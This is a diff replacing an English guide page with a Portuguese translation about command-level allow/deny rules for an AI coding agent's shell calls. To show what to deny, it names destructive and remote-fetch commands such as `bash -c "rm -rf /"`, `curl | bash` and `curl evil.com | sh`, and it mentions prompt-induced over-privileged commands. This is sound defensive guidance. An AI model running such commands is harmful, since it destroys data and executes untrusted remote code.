@@ -1,67 +1,67 @@
 ---
-title: Command Rules
-description: Command-level allow/deny for shell and tool calls—more executable than verbal agreement.
+title: Regras de comandos
+description: Constranger chamadas shell e a Ferramentas com allow/deny ao nível do comando — mais executável do que acordos orais.
 locale: pt
-source_locale: en
-source_revision: a397cb9
-translation_status: fallback
-translated_at: '2026-07-28'
+source_locale: zh-CN
+source_revision: 5f36443
+translation_status: draft
+translated_at: 2026-07-28
 ---
 
-**Command rules** focus on “which commands the Agent may run and with what arguments.” They are the most common form of [Allow and Deny Rules](/guide/customization/rules/allow-and-deny-patterns/), usually in team-reviewable configuration or rule files.
+As **regras de comandos** centram-se em «que comandos o Agent pode correr e com que parâmetros». São a forma mais comum de [regras de permitir e negar](/guide/customization/rules/allow-and-deny-patterns/), normalmente em configuração ou ficheiros de regras que a equipa pode rever.
 
-## What This Page Covers
+## O que esta página cobre
 
-- Division of labor among command rules, sandbox, and approval dialogs
-- How to write a “narrow enough” allowlist
-- Alignment with CI and local dev scripts
+- Divisão de papéis entre regras de comandos, Sandbox e diálogos de Aprovação
+- Como escrever uma allowlist «suficientemente estreita»
+- Alinhamento com CI e scripts de desenvolvimento local
 
-## What Command Rules Control
+## O que as regras de comandos gerem de facto
 
-If allow/deny states what is allowed in principle, command rules land that at the most concrete layer:
+Se allow/deny define «o que, em princípio, se pode fazer», as regras de comandos levam isso à camada mais concreta:
 
-- Which commands may run
-- Which may not
-- Which look similar but differ greatly in risk
+- Que comandos se podem correr
+- Que comandos não se podem
+- Quais parecem parecidos mas têm riscos muito diferentes
 
-The point is turning boundaries the team already knows into boundaries the machine can enforce.
+O foco é transformar fronteiras que a equipa já conhece em fronteiras que a máquina também executa.
 
-## One Core Concept First
+## Um conceito central primeiro
 
-Rules match **executable intent**, not natural language. `npm test` and `npm run test` are two different commands in policy; `bash -c "rm -rf /"` must not pass because `bash` was allowed.
+A regra corresponde a **intenção executável**, não a linguagem natural. `npm test` e `npm run test` são, em política, dois comandos diferentes; `bash -c "rm -rf /"` não pode passar só porque se permitiu `bash`.
 
 ```text
-User task → model proposes command → rule engine → (pass) sandbox execution / (reject) approval or block
+Tarefa do utilizador → modelo propõe comando → motor de regras → (passa) execução no Sandbox / (nega) Aprovação ou bloqueio
 ```
 
-## Common Misconceptions
+## Mal-entendidos habituais
 
-### Similar commands, different risk
+### Comandos parecidos não significam o mesmo risco
 
-Beginners often underestimate small differences.
+O que os principiantes mais subestimam são pequenas diferenças entre comandos.
 
-For example:
+Por exemplo:
 
-- `git status` vs `git reset --hard`
-- `npm test` vs `npm publish`
-- `curl example.com` vs `curl example.com | sh`
+- `git status` e `git reset --hard`
+- `npm test` e `npm publish`
+- `curl example.com` e `curl example.com | sh`
 
-All look like “run something in the terminal,” but risk is not the same level.
+Parecem todos «correr um comando no terminal», mas o risco não está no mesmo nível.
 
-### Allowing a general entry point often opens too much
+### Permitir uma entrada geral costuma abrir demais
 
-Allowing `bash`, `sh`, and similar general entry points may feel convenient.
+Permitir diretamente entradas como `bash` ou `sh` pode parecer só comodidade.
 
-From a rules perspective, that usually allows many dangerous compositions afterward.
+Do ponto de vista das regras, costuma equivaler a abrir também um grande número de ações perigosas que se podem compor a seguir.
 
-## Minimum Viable Practice
+## Prática mínima viável
 
-1. **Deny dangerous commands outside write operations by default**: `rm -rf`, `curl | bash`, `git push --force`
-2. **Allow common read-only/build commands in the project**: `git status`, `npm test`, `pnpm lint`
-3. **Put rules in Git**, consistent with “test commands” in `AGENTS.md`
-4. **Review rule changes in PR**, like Dockerfile changes
+1. **Negar por defeito comandos perigosos fora de operações de escrita controladas**: `rm -rf`, `curl | bash`, `git push --force`
+2. **Permitir comandos só de leitura/build comuns no projeto**: `git status`, `npm test`, `pnpm lint`
+3. **Meter as regras no Git**, alinhadas com a descrição de «comandos de teste» em `AGENTS.md`
+4. **Rever alterações de regras em PR**, como se alterasse um Dockerfile
 
-Illustrative (format per official configuration):
+Ilustração (formato conforme configuração oficial):
 
 ```json
 {
@@ -81,52 +81,52 @@ Illustrative (format per official configuration):
 }
 ```
 
-## Recommended Workflow
+## Fluxo de trabalho recomendado
 
-| Step | Practice |
+| Passo | Prática |
 |---|---|
-| Inventory | Extract real commands from `package.json` scripts, Makefile, CI workflow |
-| Layer | Organization deny baseline → project allow supplement → personal local exception (if any) |
-| Trial | Validate with low-risk tasks: “should approve does; should block blocks” |
-| Align | Local rules and [GitHub Action](/guide/developer-platform/ci-cd/code-review-automation/) share source when possible |
+| Inventário | Extrair comandos reais de `package.json` scripts, Makefile, CI workflow |
+| Camadas | Deny de linha de base da organização → allow complementar do projeto → exceções pessoais na máquina (se houver) |
+| Ensaio | Validar com Tarefas de baixo risco «o que deve passar, passa; o que deve bloquear, bloqueia» |
+| Alinhamento | Regras locais e [GitHub Action](/guide/developer-platform/ci-cd/code-review-automation/) com a mesma origem tanto quanto possível |
 
-## Common Mistakes
+## Erros habituais
 
-- **Allowlist too wide**: allowing `bash`, `sh`, `sudo` is like allowing everything
-- **Only deny, no allow**: still many approvals; teams habitually click through
-- **Docs disagree**: `AGENTS.md` says `pnpm test`, rules only have `npm test`
-- **Ignore pipes and redirects**: `curl evil.com | sh` needs whole-command policy, not just the first token
+- **Allowlist demasiado ampla**: permitir `bash`, `sh`, `sudo` ≈ abrir tudo
+- **Só deny sem allow**: ainda muitos diálogos de Aprovação; a equipa habitua-se a aprovar tudo
+- **Inconsistência com a documentação**: `AGENTS.md` diz `pnpm test`, as regras só têm `npm test`
+- **Ignorar pipes e redirecionamentos**: `curl evil.com | sh` precisa de política de conjunto, não só da primeira palavra
 
-Command rules are not “memorizing commands”—they separate daily actions from commands that, once allowed, blow open the risk boundary.
+As regras de comandos não «memorizam comandos» — distinguem ações quotidianas das que, uma vez abertas, podem abrir também a fronteira de risco.
 
-## Security Boundaries
+## Limites de segurança
 
-- Command rules **cannot** replace branch protection and code review
-- Malicious prompts may induce the Agent to **attempt** over-privileged commands—keep sandbox defaults strict
-- Environment variables with keys or tokens should not leak because “echo was allowed”
+- As regras de comandos **não substituem** proteção de branches nem code review
+- Prompts maliciosos podem induzir o Agent a **tentar** comandos fora de âmbito — mantenha o Sandbox estrito por defeito
+- Variáveis de ambiente com segredos/Tokens não devem vazar só porque se «permitiu echo»
 
-## Acceptance Checklist
+## Lista de verificação
 
-- [ ] You can list 3–5 “run daily” commands for this repo and reflect them in rules
-- [ ] High-risk commands like `git push` and forced reset are denied by default or need explicit approval
-- [ ] Rule changes go through PR and do not contradict `AGENTS.md`
+- [ ] Consegue listar 3–5 comandos «obrigatórios todos os dias» deste repositório e refletí-los nas regras
+- [ ] Comandos de alto risco como `git push` e reset forçado são negados por defeito ou exigem Aprovação explícita
+- [ ] Alterações de regras passam por PR e não contradizem `AGENTS.md`
 
-## Related Chapters
+## Capítulos relacionados
 
-- [Allow and Deny Patterns](/guide/customization/rules/allow-and-deny-patterns/)
-- [Team Rules Policy](/guide/customization/rules/team-rules/)
-- [CLI Approval and Sandbox](/guide/cli/approvals-and-sandbox/)
-- [Permission Matrix](/guide/reference/permission-matrix/)
+- [Padrões de permitir e negar](/guide/customization/rules/allow-and-deny-patterns/)
+- [Política de regras de equipa](/guide/customization/rules/team-rules/)
+- [Aprovação e Sandbox no CLI](/guide/cli/approvals-and-sandbox/)
+- [Matriz de Permissões](/guide/reference/permission-matrix/)
 
-## References
+## Referências
 
 - stormzhang `15-permissions.md`, `18-config.md`
-- KimYx0207 permissions and configuration chapter
-- freestylefly/CodexGuide team playbook
+- Capítulos de Permissões e configuração KimYx0207
+- Playbook de equipa freestylefly/CodexGuide
 
 ---
 
-**Status:** verified  
-**Applicable products:** CLI / App  
-**Verification basis:** OpenAI’s current Codex CLI documentation still treats command execution, approval modes, and sandbox isolation as core security boundaries; this page positions command rules as an engineering pattern for separating high- and low-risk commands and marks the JSON snippet as illustrative, not official syntax.  
-**Last verified:** 2026-07-26
+**Estado:** verificado  
+**Produtos aplicáveis:** CLI / App  
+**Base de verificação:** A documentação atual do OpenAI Codex CLI continua a tratar execução de comandos, modos de Aprovação e isolamento de Sandbox como fronteiras centrais de segurança; esta página posiciona as regras de comandos como padrão de engenharia para «gerir separadamente comandos de alto e baixo risco», e marca explicitamente o fragmento JSON como ilustração, sem apresentar sintaxe específica como facto oficial.  
+**Última verificação:** 2026-07-26
